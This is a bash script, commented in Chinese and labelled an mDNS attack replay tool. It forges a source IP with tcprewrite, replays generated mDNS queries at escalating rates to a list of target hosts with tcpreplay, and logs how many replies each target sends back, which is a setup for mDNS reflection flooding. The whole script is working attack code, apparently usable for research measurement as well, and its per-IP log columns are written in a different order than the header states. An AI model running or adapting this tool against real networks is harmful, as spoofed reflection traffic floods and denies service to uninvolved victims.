#!/bin/bash

# ----------------------------------------
# mDNS 攻击回放脚本
# 用于批量生成并回放 mDNS 查询流量
# ----------------------------------------

# ========== 用户需填写的参数 ==========
IFACE="ens160"                        # 网络接口名
SRC_IP="填写源IP"                  # 伪造的源 IP
IP_LIST_FILE="available_ip_list.csv"  # 目标 IP 列表文件
OUTPUT_DIR="./output"                 # 输出目录
PYTHON_SCRIPT="packet_gen.py"         # 生成数据包脚本
CAPFILE="$OUTPUT_DIR/capture.pcap"    # 临时抓包文件
INPUT_PCAP="$OUTPUT_DIR/input.pcap"   # 临时输入 pcap
FIXED_PCAP="$OUTPUT_DIR/fixed.pcap"   # 修正后的 pcap

INITIAL_RATE=100                      # 起始回放速率 (pps)
MAX_RATE=2000                         # 最大回放速率 (pps)
STEP=100                              # 速率步长
LOOP_COUNT=5000                       # 回放循环次数
CAP_DURATION=10                       # 抓包持续时间 (秒)
IP_COUNT=50                           # 处理前多少个目标 IP

# ========== 初始化 ==========
mkdir -p "$OUTPUT_DIR"
ALL_LOG="$OUTPUT_DIR/all_results.csv"
echo "ip,rate_pps,sent_packets,received_timedela,received_packets,receive_rate_pps" > "$ALL_LOG"

# 读取目标 IP 列表
IP_LIST=$(tail -n +2 "$IP_LIST_FILE" | cut -d',' -f1 | head -n $IP_COUNT)

# ========== 主流程 ==========
for DST_IP in $IP_LIST; do
    # 生成数据包
    python3 $PYTHON_SCRIPT $DST_IP $SRC_IP $INPUT_PCAP
    if [ $? -ne 0 ]; then
        echo "[!] 跳过无响应的目标 $DST_IP"
        continue
    fi

    # 修正 PCAP
    sudo tcprewrite \
        --srcipmap=0.0.0.0/0:$SRC_IP \
        --dstipmap=0.0.0.0/0:$DST_IP \
        --fixcsum \
        --infile=$INPUT_PCAP --outfile=$FIXED_PCAP --dlt=enet >/dev/null

    # 日志文件
    SAFE_IP=$(echo "$DST_IP" | tr '.' '_')
    IP_LOG="$OUTPUT_DIR/log_ip_${SAFE_IP}.csv"
    echo "rate_pps,sent_packets,received_timedela,received_packets,receive_rate_pps" > "$IP_LOG"

    # 速率回放循环
    for ((RATE=$INITIAL_RATE; RATE<=$MAX_RATE; RATE+=$STEP)); do
        echo "[*] 回放速率: $RATE pps"

        # 抓包
        sudo tcpdump -i $IFACE udp port 5353 -w $CAPFILE &
        TCPDUMP_PID=$!
        sleep 1

        # 回放数据包
        sudo tcpreplay --intf1=$IFACE --loop=$LOOP_COUNT --pps=$RATE $FIXED_PCAP

        sleep $CAP_DURATION
        sudo kill $TCPDUMP_PID

        # 统计数据
        PCAP_PKT_NUM=$(tcpdump -nnr $FIXED_PCAP 2>/dev/null | wc -l)
        SENT_COUNT=$((LOOP_COUNT * PCAP_PKT_NUM))
        RECV_COUNT=$(tcpdump -nnr $CAPFILE 'udp and src port 5353' 2>/dev/null | wc -l)
        if [ $RECV_COUNT -lt 0 ]; then RECV_COUNT=0; fi

        # 获取首尾时间戳
        FIRST_TS=$(tcpdump -nnr $CAPFILE 'udp and src port 5353' -tt 2>/dev/null | head -n 1 | awk '{print $1}')
        LAST_TS=$(tcpdump -nnr $CAPFILE 'udp and src port 5353' -tt 2>/dev/null | tail -n 1 | awk '{print $1}')
        if [[ -n "$FIRST_TS" && -n "$LAST_TS" ]]; then
            TIME_DELTA=$(echo "$LAST_TS - $FIRST_TS" | bc -l)
        else
            TIME_DELTA=0
        fi

        # 计算速率
        if (( $(echo "$TIME_DELTA > 0" | bc -l) )); then
            RECV_RATE_FMT=$(printf "%.3f" "$(echo "scale=6; $RECV_COUNT / $TIME_DELTA" | bc -l)")
        else
            RECV_RATE_FMT=0
        fi

        echo "$RATE,$SENT_COUNT,$RECV_COUNT,$TIME_DELTA,$RECV_RATE_FMT" >> "$IP_LOG"
        echo "$DST_IP,$RATE,$SENT_COUNT,$TIME_DELTA,$RECV_COUNT,$RECV_RATE_FMT" >> "$ALL_LOG"
    done

    echo "[+] $DST_IP 完成，结果写入 $IP_LOG"
done

echo "所有测试完成，汇总结果保存在 $ALL_LOG"
